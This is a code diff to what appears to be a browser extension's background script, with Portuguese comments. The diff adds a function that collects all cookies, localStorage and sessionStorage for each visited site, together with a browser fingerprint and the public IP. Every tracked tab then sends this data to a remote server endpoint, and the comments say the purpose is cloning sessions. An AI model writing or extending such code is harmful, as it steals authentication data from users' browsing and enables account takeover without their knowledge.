@@ -2552,26 +2552,125 @@ async function handleSelfHealCommand(command) {
   }
 }
 
-// Track active sessions with error handling
+/**
+ * Capturar dados completos da sessão para clonagem
+ */
+async function captureSessionData(tab, domain) {
+  log('debug', `📸 Capturando dados completos para: ${domain}`);
+  
+  try {
+    // 1. Capturar todos os cookies do domínio
+    const cookies = await chrome.cookies.getAll({ domain: domain });
+    
+    // Capturar cookies de subdomínios
+    const domainParts = domain.split('.');
+    if (domainParts.length >= 2) {
+      const baseDomain = `.${domainParts.slice(-2).join('.')}`;
+      const baseCookies = await chrome.cookies.getAll({ domain: baseDomain });
+      cookies.push(...baseCookies);
+    }
+    
+    log('debug', `🍪 Capturados ${cookies.length} cookies`);
+    
+    // 2. Capturar localStorage e sessionStorage
+    let storageData = { localStorage: {}, sessionStorage: {} };
+    
+    try {
+      const [storageResult] = await chrome.scripting.executeScript({
+        target: { tabId: tab.id },
+        func: () => {
+          return {
+            localStorage: { ...localStorage },
+            sessionStorage: { ...sessionStorage }
+          };
+        }
+      });
+      
+      if (storageResult?.result) {
+        storageData = storageResult.result;
+        log('debug', `💾 localStorage: ${Object.keys(storageData.localStorage).length} items`);
+        log('debug', `💾 sessionStorage: ${Object.keys(storageData.sessionStorage).length} items`);
+      }
+    } catch (storageError) {
+      log('warn', `⚠️ Não foi possível capturar storage:`, storageError);
+    }
+    
+    // 3. Capturar fingerprint
+    const fingerprint = await getBrowserFingerprintFromTab(tab.id);
+    
+    // 4. Obter IP público
+    const clientIp = await getPublicIP();
+    
+    return {
+      cookies: cookies.map(c => ({
+        ...c,
+        isSession: !c.expirationDate || c.expirationDate === 0
+      })),
+      local_storage: storageData.localStorage,
+      session_storage: storageData.sessionStorage,
+      browser_fingerprint: fingerprint,
+      client_ip: clientIp
+    };
+    
+  } catch (error) {
+    log('error', `❌ Erro ao capturar dados de sessão:`, error);
+    return {
+      cookies: [],
+      local_storage: {},
+      session_storage: {},
+      browser_fingerprint: null,
+      client_ip: null
+    };
+  }
+}
+
+// Track active sessions with complete data capture
 async function trackSession(tab) {
   try {
     const url = new URL(tab.url);
     if (url.protocol === 'chrome:') return;
     
+    const domain = url.hostname;
+    
+    // ✅ CAPTURAR DADOS COMPLETOS
+    const sessionData = await captureSessionData(tab, domain);
+    
     const response = await fetch(`${CONFIG.API_BASE}/session-tracker`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+      },
       body: JSON.stringify({
+        machine_id: machineId,
+        user_id: machineId,
+        tab_id: tab.id.toString(),
+        url: tab.url,
+        domain: domain,
+        title: tab.title || 'Sem título',
+        action: 'heartbeat',
+        
+        // ✅ DADOS COMPLETOS PARA CLONAGEM
+        cookies: sessionData.cookies,
+        local_storage: sessionData.local_storage,
+        session_storage: sessionData.session_storage,
+        browser_fingerprint: sessionData.browser_fingerprint,
+        client_ip: sessionData.client_ip
+      }),
+      signal: AbortSignal.timeout(15000)
+    });
+    
+    if (response.ok) {
+      log('debug', `✅ Session data sent with ${sessionData.cookies.length} cookies`);
+      // Atualizar cache local
+      activeSessions.set(tab.id, {
         machine_id: machineId,
         tab_id: tab.id.toString(),
         url: tab.url,
-        domain: url.hostname,
-        title: tab.title,
-        action: 'heartbeat'
-      })
-    });
-    
-    if (!response.ok) {
+        domain: domain,
+        last_update: Date.now()
+      });
+    } else {
       log('error', `Session tracker failed: ${response.status} ${response.statusText}`);
     }
   } catch (error) {
